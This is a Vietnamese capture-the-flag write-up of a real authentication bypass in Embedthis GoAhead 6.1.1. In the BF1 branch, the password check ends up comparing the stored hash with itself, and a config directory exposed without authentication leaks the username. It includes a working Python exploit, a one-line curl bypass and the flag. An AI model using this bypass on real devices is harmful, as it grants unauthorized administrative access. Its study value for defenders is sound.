---
title: "VULN#005"
category: "Vuln Research"
tags: ["goahead", "embedded-web-server", "authentication-bypass", "bf1", "blowfish", "basic-auth", "iot"]
solve_date: "2026-10-20T22:00:00+07:00"
language: "vi"
points: 30
---

# VULN#005 — GoAhead 6.1.1 so sánh BF1 hash với chính nó

**Flag:** CTF{e0dd76943e73bfa5e49e2496bd55e536}  
**Service:** 169.58.126.107:7020  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| goahead-src.tar.gz (handout) | 567,117 | — |
| /config/auth.txt (đã đọc được) | 262 | — |
| /config/route.txt (đã đọc được) | 132 | — |

Trong phiên solve không ghi SHA-256; kích thước lấy từ transcript.

## Đề bài

> Acme Gateway là cổng quản lý thiết bị IoT nhỏ. Nó chạy trên một embedded web server mã nguồn mở có thật, tại revision thực tế — không phải bản viết lại cho vui hay bug được cài riêng.
>
> Có đúng source tree target được build từ đó.
>
> 169.58.126.107 7020

Portal có landing page public và admin console tại /admin/ được bảo vệ bằng HTTP Basic authentication. Handout là source tree Embedthis GoAhead; cần tìm lỗi thật trong revision đó để truy cập dữ liệu chỉ dành cho admin.

## Phân tích

### Xác định phiên bản

package.json trong handout ghi version 6.1.1, build rules compile mọi object với -DME_VERSION=\"6.1.1\", và local build cùng cây source in Version: 6.1.1 khi khởi động. File handout mang timestamp 2026-08-21 06:04, trước lần viết lại authentication upstream vào tháng 10/2026.

Backup trên thiết bị gọi firmware là 6.1.0-internal; đó là nhãn firmware của Acme, không phải version GoAhead nên không nhầm với server release đang kiểm tra.

### Bug: websVerifyPasswordFromFile()

src/auth.c:583 xác minh credentials cho user lấy từ file. Nhánh BF1 cần so plaintext người dùng nhập với Blowfish hash đã lưu, nhưng lại bỏ kết quả đó:

```c
PUBLIC bool websVerifyPasswordFromFile(Webs *wp)
{
    char passbuf[ME_GOAHEAD_LIMIT_PASSWORD * 3 + 3];
    bool success;

    assert(wp);
    if (!wp->user && (wp->user = websLookupUser(wp->username)) == 0) {
        trace(5, "verifyUser: Unknown user \"%s\"", wp->username);
        return 0;
    }
    /*
        Verify the password. BF1 means blowfish salted hash.
        If using Digest auth, we compare the digest of the password.
        Otherwise we encode the plain-text password and compare that
     */
    if (sstarts(wp->user->password, "BF1:")) {
        // Blowfish salted hash
        success = websCheckPassword(wp->password, wp->user->password);
        wfree(wp->password);
        wp->password = sclone(wp->user->password);

    } else if (!wp->encoded) {
        fmt(passbuf, sizeof(passbuf), "%s:%s:%s", wp->username, ME_GOAHEAD_REALM, wp->password);
        wfree(wp->password);
        wp->password = websMD5(passbuf);
        wp->encoded = 1;
    }
    if (wp->digest) {
        success = pmatch(wp->password, wp->digest);
    } else {
        success = pmatch(wp->password, wp->user->password);
    }
    if (success) {
        trace(5, "User \"%s\" authenticated", wp->username);
    } else {
        trace(5, "Password for user \"%s\" failed to authenticate", wp->username);
    }
    return success;
}
```

Ba dòng quyết định challenge:

1. Line 600 tính verdict thật vào success.
2. Line 602 ghi đè wp->password bằng bản sao stored hash, làm mất plaintext.
3. Line 617 gán lại success bằng phép so wp->password với wp->user->password.

Sau bước 2, hai operand là cùng một string nên pmatch() trả true với mọi password. Bản thân constant-time comparison viết đúng; vấn đề là hai đầu vào giống hệt nhau. Lời gọi websCheckPassword() ở trên trở thành code thừa.

Đây là **so sánh password luôn đúng / authentication bypass** trong file auth store. Trong phiên solve chưa xác định CVE cho revision này; upstream sửa bằng cách viết lại function trong security series tháng 10/2026.

Nhánh lỗi chỉ chạy khi wp->digest null, tức Basic và form authentication. Digest request mang client-computed digest trong wp->digest, nên line 615 so stored hash với digest đó và vẫn thất bại. Portal dùng auth=basic, đúng đường lỗi.

### Phần triển khai: /config/ nằm trong document root

Lỗi code cần username. Target để lộ username: document root tĩnh có thư mục config chứa route và credential file, còn catch-all route phục vụ chúng mà không xác thực. Có thể GET trực tiếp cả hai file:

```text
# /config/route.txt
route uri=/admin/ auth=basic abilities=manage
route uri=/
```
```text
# /config/auth.txt
role name=user abilities=view
role name=administrator abilities=user,manage

user name=svc-acme-prov password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
```

Chuỗi BF1 có dạng BF1:<rounds>:<salt>:<hash> (src/crypt.c:1003). Do bug, hash không còn là trở ngại: server so giá trị này với chính nó. Chỉ cần biết tên account, và tên nằm ngay trong file đó.

Landing page gợi ý cách đặt tên nhưng không nói thẳng: nhắc process pool svc, log “prov” và model acme-gw-44xx.

### Xác nhận local

Handout build được trên Ubuntu 22.04 sau khi xử lý khác biệt linker flag trong generated makefile; chạy với route.txt lab có route uri=/admin/ auth=basic abilities=manage. Gửi password sai với trace level 5:

```text
goahead: 5: Examine route /admin/
goahead: 5: User "admin" authenticated
goahead: 2: Access Denied. Insufficient capabilities.
```

Authentication vẫn qua với WRONGPASS; request chỉ fail ở authorization vì auth.txt lab không có role cấp manage. User không tồn tại và request không xác thực đều trả 401, nên bypass gắn với BF1 account hợp lệ chứ không phải cho phép tất cả.

### Upstream fix

Upstream hiện xử lý digest trước, sau đó dispatch theo định dạng stored hash và giữ nguyên kết quả kiểm tra Blowfish:

```c
if (wp->digest) {
    if (!isMd5Hash(wp->user->password)) { ... return 0; }
    success = pmatch(wp->digest, wp->password);
} else if (isBlowfishHash(wp->user->password)) {
    if (!makePasswordPreimage(passbuf, sizeof(passbuf), wp->username, wp->password)) { ... }
    success = websCheckPassword(passbuf, wp->user->password);
} else {
    ...
}
```

Bản viết lại cũng hash dạng username:realm:password, nên stored hash không dùng chung được giữa account hoặc realm. Fix xuất hiện trong security series 2026-10-18 (“FIX: strengthen authentication, password hashing and sessions”), sau đó được gộp vào security commit ngày 2026-10-19.

## Lời giải

### 1. Fingerprint server

GET /admin/ trả error page của GoAhead kèm Basic challenge; trang 429 là của nginx — box nằm sau reverse proxy rate-limit /admin/:

```text
HTTP/1.1 401 Unauthorized
Server: nginx
Content-Length: 151
WWW-Authenticate: Basic realm="example.com"
X-Frame-Options: SAMEORIGIN

<html>
    <head><title>Document Error: Unauthorized</title></head>
    <body>
        <h2>Access Error: Unauthorized</h2>
    </body>
</html>
```

GET / redirect tới /index.html, landing page Acme Gateway.

### 2. Tìm config directory không cần xác thực

Quét directory cho thấy /config trả 302 tới /config/index.html (404), thay vì 404 ngay. Nghĩa là directory được serve và có thể request file trực tiếp:

```text
!!! 200        /config/auth.txt  [HTTP/1.1 200 OK len=262]
!!! 200        /config/route.txt  [HTTP/1.1 200 OK len=132]
```

Từ đó lấy được account svc-acme-prov, BF1 hash và policy auth=basic abilities=manage trên /admin/.

### 3. Đăng nhập bằng password bất kỳ

Basic auth đi qua nhánh BF1; phép kiểm tra rút gọn thành so sánh chuỗi với chính nó. Password hacked (sau đó thử anything) được chấp nhận:

```text
HTTP/1.1 302 Redirect
Location: http://169.58.126.107:7020/admin/index.html
Set-Cookie: -goahead-session-=::webs.session::YOh6cLElQshmmgwHWLNy3g==; path=/; domain=169.58.126.107; httponly; SameSite=Lax
```

302 tới /admin/index.html cùng session cookie là dấu hiệu thành công; credential sai thật vẫn ở 401.

### 4. Đọc dữ liệu admin

Console có link tới configuration backup:

```text
HTTP/1.1 200 OK
<!doctype html>
<title>Acme Gateway - Admin Console</title>
<h1>Admin Console</h1>
<p>Welcome, administrator.</p>
<ul>
  <li><a href="/admin/device-config.json">Device configuration backup</a></li>
</ul>
```

/admin/flag.txt trả 404; flag nằm trong backup.

## Mã khai thác

```python
#!/usr/bin/env python3
"""VULN#005 - GoAhead 6.1.1 BF1 tautological password check."""
import base64, re, socket, time

HOST, PORT = "169.58.126.107", 7020


def get(path, user=None, password=None, tries=8):
    for _ in range(tries):
        s = socket.create_connection((HOST, PORT), 15)
        req = ["GET %s HTTP/1.1" % path,
               "Host: %s:%d" % (HOST, PORT),
               "User-Agent: Mozilla/5.0",
               "Connection: close"]
        if user is not None:
            tok = base64.b64encode(("%s:%s" % (user, password)).encode()).decode()
            req.append("Authorization: Basic " + tok)
        s.sendall(("\r\n".join(req) + "\r\n\r\n").encode())
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        s.close()
        resp = data.decode("latin-1")
        if resp.split("\r\n")[0].split()[1] != "429":
            return resp
        time.sleep(25)          # nginx limit_req on /admin/
    return resp


# 1. The config directory is served without authentication.
auth_txt = get("/config/auth.txt")
user = re.search(r"user name=(\S+) password=BF1:", auth_txt).group(1)
print("username:", user)

# 2. Any password passes for a BF1 account under Basic auth.
resp = get("/admin/", user, "anything")
print(resp.split("\r\n")[0])
print([l for l in resp.split("\r\n") if l.lower().startswith("set-cookie")])

# 3. Read the admin-only backup.
resp = get("/admin/device-config.json", user, "anything")
print(resp.partition("\r\n\r\n")[2])
```

Khi đã biết username, toàn bộ exploit cũng thực hiện được bằng một request:

```bash
curl -s -u "svc-acme-prov:anything" http://169.58.126.107:7020/admin/device-config.json
```

## Kết quả

```text
========= /admin/index.html =========
HTTP/1.1 200 OK
<!doctype html>
<title>Acme Gateway - Admin Console</title>
<h1>Admin Console</h1>
<p>Welcome, administrator.</p>
<ul>
  <li><a href="/admin/device-config.json">Device configuration backup</a></li>
</ul>

========= /admin/flag.txt =========
HTTP/1.1 404 Not Found
<html>
    <head><title>Document Error: Not Found</title></head>
    <body>
        <h2>Access Error: Not Found</h2>
    </body>
</html>
```
```text
$ curl -s -u "svc-acme-prov:anything" http://169.58.126.107:7020/admin/device-config.json
{
  "device_id": "acme-gw-4471",
  "firmware": "6.1.0-internal",
  "recovery_token": "CTF{e0dd76943e73bfa5e49e2496bd55e536}"
}
```

**Flag: CTF{e0dd76943e73bfa5e49e2496bd55e536}**

## Ghi chú

- Hai phần phối hợp với nhau: lỗi code bỏ yêu cầu password, còn thư mục config đặt sai vị trí cung cấp username. Lời giải cần cả hai.
- Đừng đọc 401 Access Denied. Insufficient capabilities. ở local như bypass thất bại. Trace lab đã ghi User "admin" authenticated; 401 do auth.txt lab thiếu role abilities. Trên target, role name=administrator abilities=user,manage đáp ứng route abilities=manage.
- Digest authentication không bị ảnh hưởng: wp->digest khác null nên phép so cuối so với client digest, không phải stored hash.
- /admin/ bị rate-limit (nginx 429), còn /index.html chịu được 20 request nhanh. Script hoạt động chờ 25 giây rồi retry khi 429; các lần enumeration được gửi có giãn cách.
- /admin/flag.txt trả 404 trên target; flag chỉ có trong device-config.json.
- Git Bash đổi argument /config/ thành C:/Program Files/Git/config/, dẫn tới một loạt HTTP 400 giả khi enumeration. Đặt MSYS_NO_PATHCONV=1 để tránh.
- Revision là GoAhead 6.1.1 ngày 2026-08-21, trước upstream authentication rewrite, nên bug có thật trong source được giao chứ không phải cài riêng cho challenge.

## Tham khảo

- Embedthis GoAhead 6.1.1 — src/auth.c:583 websVerifyPasswordFromFile()
- Embedthis GoAhead 6.1.1 — src/crypt.c:1003 định dạng BF1 và websCheckPassword()
- Upstream commit e018d1f0b961278cc48bf721a3a9ee86c50153b4 — “FIX: strengthen authentication, password hashing and sessions” (2026-10-18)
- Upstream commit 5878a2ac2827a1806e93d2902cedacaa138e1376 — “FIX: security fixes for request reading, routing, ROM and file serving, CGI, authentication, TLS and sockets” (2026-10-19)
